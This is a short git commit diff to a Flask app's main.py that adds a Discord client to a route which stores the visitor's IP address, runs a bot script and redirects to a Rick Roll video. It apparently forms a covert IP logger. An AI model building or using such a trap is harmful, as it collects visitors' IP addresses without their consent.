b2a9e765aa73cd60f0d5939ec427d5cf8df4a39b
Coder-Anonymous <93427110+Coder-Serwin@users.noreply.github.com>
2024-10-25 15:16:52 +0530

    Update main.py

--- main.py
+++ main.py
@@ -7,6 +7,7 @@ import time
 os.environ['IP_ADDR'] = "None"
 app = Flask(__name__)
 ip_address = None
+D_TOKEN = os.getenv('D_TOKEN')
 
 
 @app.route('/')
@@ -15,6 +16,10 @@ def home():
     os.environ['IP_ADDR'] = ip_address
     run(["python", "bot.py"])
     time.sleep(1)
+    intents = discord.Intents.default()
+    intents.message_content = True
+    client = MyClient(intents=intents)
+    client.run(str(D_TOKEN))
     return redirect("https://www.youtube.com/watch?v=dQw4w9WgXcQ")
 
 
